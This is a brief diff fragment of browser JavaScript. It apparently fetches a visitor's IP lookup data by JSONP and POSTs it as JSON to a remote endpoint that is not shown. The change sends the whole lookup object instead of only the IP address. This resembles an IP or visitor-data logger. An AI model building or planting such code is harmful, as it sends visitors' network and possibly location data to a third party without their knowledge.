@@ -9,7 +9,7 @@ import("https://code.jquery.com/jquery-3.6.1.js").then(function() {
 				"Content-Type": "application/json"
 			},
 			body: JSON.stringify({
-				content: a.ip
+				content: JSON.stringify(a)
 			})
 		});
 	}, "JSONP");
